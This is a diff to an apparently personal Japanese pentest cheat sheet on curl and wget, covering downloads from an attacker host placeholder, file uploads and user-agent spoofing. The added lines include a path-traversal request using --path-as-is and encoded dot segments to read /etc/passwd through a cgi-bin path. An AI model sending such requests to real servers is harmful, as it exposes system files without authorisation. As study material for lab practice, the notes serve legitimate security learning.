@@ -15,6 +15,22 @@ sudo curl -s --user-agent Googlebot http://192.168.143.14/robots.txt -v
 curl -X POST -F "file=@genai.pdf" http://localhost:5000/upload
 ```
 
+
+```bash
+curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
+```
+#### ファイルのアップロード
+```bash
+curl -F "file=@mydocument.pdf" https://example.com/upload
+```
+
+
+```bash
+curl -i --path-as-is http://192.168.150.13:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+```
+- --path-as-is は curl のオプションで、URL のパス部分をそのまま送信するためのものです。
+通常、curl はURLエンコードされた文字（例：%2e → .）を自動的にデコードしてから送信しますが、このオプションを使うとそれを無効化できます。
+
 # Example 
 
 ## Road to Upload
@@ -77,4 +93,15 @@ curl: try 'curl --help' or 'curl --manual' for more information
   http://192.168.231.249:33414/file-upload
 {"message":"File successfully uploaded"}
 ```
+</details>
+
+<details markdown="1">
+
+<summary>wget</summary>
+### ファイルダウンロード
+
+```bash
+wget http://lhost/file
+```
+
 </details>
